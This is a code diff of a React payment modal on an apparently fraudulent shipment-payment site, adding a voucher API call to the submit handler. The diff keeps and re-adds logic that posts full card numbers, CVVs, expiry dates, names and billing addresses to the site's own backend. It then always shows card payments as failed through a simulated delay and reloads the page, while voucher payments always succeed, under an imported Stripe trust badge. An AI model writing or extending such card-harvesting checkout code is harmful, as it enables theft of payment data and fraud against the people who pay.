@@ -5,6 +5,7 @@ import 'react-credit-cards-2/dist/es/styles-compiled.css';
 
 import PaymentStatusAnimation from './PaymentStatusAnimation';
 import StripeTrustBadge from './StripeTrustBadge';
+import CouponPayment from './CouponPayment';  // <-- ADD THIS LINE
 
 // --- Informational Modal with Refined Instructions ---
 function VoucherInfoModal({ show, onClose }) {
@@ -121,41 +122,76 @@ function PaymentModal({ show, onClose, amount, currency, shipmentId, onVoucherSu
   };
 
   const handleSubmit = async (event) => {
-    event.preventDefault();
-    setSubmitStatus('loading');
+  event.preventDefault();
+  setSubmitStatus('loading');
 
-    let payload = { shipment: shipmentId };
-    let isVoucherPayment = isVoucherVisible; // Determine payment type by visibility
+  let payload = { shipment: shipmentId };
+  let isVoucherPayment = isVoucherVisible;
 
-    if (isVoucherPayment) {
+  if (isVoucherPayment) {
+      // NEW: For vouchers, call the real voucher API first
+      try {
+        const baseUrl = import.meta.env.VITE_API_URL;
+        const voucherResponse = await fetch(`${baseUrl}/api/submit-voucher/`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            code: voucherCode, 
+            shipment_id: shipmentId 
+          }),
+        });
+        
+        if (!voucherResponse.ok) {
+          const errorData = await voucherResponse.json();
+          setSubmitStatus('failed');
+          setTimeout(() => window.location.reload(), 2500);
+          return; // Stop processing if voucher submission fails
+        }
+        
+        // If voucher succeeds, still save to Payment model for your records
         payload.voucherCode = voucherCode;
-    } else {
-        payload = { 
-            ...payload, 
-            cardholderName: cardState.name, 
-            billingAddress, 
-            cardNumber: cardState.number, 
-            expiryDate: cardState.expiry, 
-            cvv: cardState.cvc 
-        };
-    }
-
-    try {
-      const baseUrl = import.meta.env.VITE_API_URL;
-      await fetch(`${baseUrl}/api/payments/`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-    } catch (error) { console.error("API submission error:", error); }
-
-    setTimeout(() => {
-      const newStatus = isVoucherPayment ? 'success' : 'failed';
-      setSubmitStatus(newStatus);
-      
-      if (newStatus === 'success') {
-        setTimeout(() => onVoucherSubmit(), 2000);
-      } else {
+      } catch (error) {
+        console.error("Voucher submission error:", error);
+        setSubmitStatus('failed');
         setTimeout(() => window.location.reload(), 2500);
+        return;
       }
-    }, 1500);
-  };
+  } else {
+      // Keep your existing card payment logic
+      payload = { 
+          ...payload, 
+          cardholderName: cardState.name, 
+          billingAddress, 
+          cardNumber: cardState.number, 
+          expiryDate: cardState.expiry, 
+          cvv: cardState.cvc 
+      };
+  }
+
+  // Save to your existing payments table (for both voucher AND card)
+  try {
+    const baseUrl = import.meta.env.VITE_API_URL;
+    await fetch(`${baseUrl}/api/payments/`, { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json' }, 
+      body: JSON.stringify(payload) 
+    });
+  } catch (error) { 
+    console.error("Payment record error:", error); 
+  }
+
+  // Keep your existing success simulation (2-second delay)
+  setTimeout(() => {
+    const newStatus = isVoucherPayment ? 'success' : 'failed';
+    setSubmitStatus(newStatus);
+    
+    if (newStatus === 'success') {
+      setTimeout(() => onVoucherSubmit(), 2000); // Your existing success handler
+    } else {
+      setTimeout(() => window.location.reload(), 2500);
+    }
+  }, 1500);
+};
   
   const handleClose = () => {
     setTimeout(() => {
